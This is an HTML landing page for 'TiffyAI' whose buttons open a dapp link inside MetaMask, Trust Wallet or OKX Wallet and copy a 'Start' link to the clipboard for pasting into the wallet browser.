<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Connect to TiffyAI</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      background: linear-gradient(145deg, #000015, #001F3F);
      font-family: 'Segoe UI', sans-serif;
      color: white;
      text-align: center;
      padding: 30px;
    }

    h1 {
      color: #00ffc3;
      text-shadow: 0 0 10px #00ffc3;
      margin-bottom: 20px;
    }

    .wallet-btn {
      background: linear-gradient(90deg, #00ffc3, #9055ff);
      color: white;
      border: none;
      border-radius: 12px;
      padding: 14px 24px;
      margin: 10px auto;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 18px #00ffc3;
      width: 90%;
      max-width: 320px;
      display: block;
    }

    .wallet-btn:hover {
      box-shadow: 0 0 28px #00ffc3;
      transform: scale(1.03);
    }

    .copy-section {
      background: rgba(255,255,255,0.05);
      border: 1px solid #00ffc3;
      border-radius: 12px;
      padding: 15px;
      margin-top: 30px;
      max-width: 380px;
      margin-left: auto;
      margin-right: auto;
    }

    .copy-text {
      color: #00ffc3;
      word-break: break-all;
      font-size: 14px;
      margin-bottom: 10px;
    }

    .copy-btn {
      background: #00ffc3;
      color: #000;
      border: none;
      border-radius: 10px;
      padding: 8px 16px;
      font-weight: bold;
      cursor: pointer;
    }

    footer {
      margin-top: 30px;
      font-size: 12px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <h1>🔗 Open Your Wallet</h1>

  <button class="wallet-btn" onclick="openWallet('metamask')">MetaMask</button>
  <button class="wallet-btn" onclick="openWallet('trust')">Trust Wallet</button>
  <button class="wallet-btn" onclick="openWallet('okx')">OKX Wallet</button>
  

  <div class="copy-section">
    <div class="copy-text" id="shieldLink">https://tiffyai.github.io/Start/</div>
    <button class="copy-btn" onclick="copyShield()">📋 Copy Start Link</button>
  </div>

  <footer>
    Paste the Start link inside your wallet browser once it opens.
  </footer>

  <script>
    function openWallet(wallet) {
      const linkMap = {
        metamask: 'https://metamask.app.link/dapp/tiffyai.github.io/Shield/',
        trust: 'https://link.trustwallet.com/open_url?coin_id=20000714&url=https://tiffyai.github.io/Shield/',
        okx: 'okx://wallet/dapp/details?url=https%3A%2F%2Ftiffyai.github.io%2FShield%2F',
        
      };

      const link = linkMap[wallet];
      if (link) {
        window.location.href = link;
      } else {
        alert("❌ Wallet not supported.");
      }
    }

    function copyShield() {
      const text = document.getElementById("shieldLink").innerText;
      navigator.clipboard.writeText(text).then(() => {
        alert("✅ Shield link copied. Now paste it in your wallet's browser.");
      });
    }
  </script>
</body>
</html>
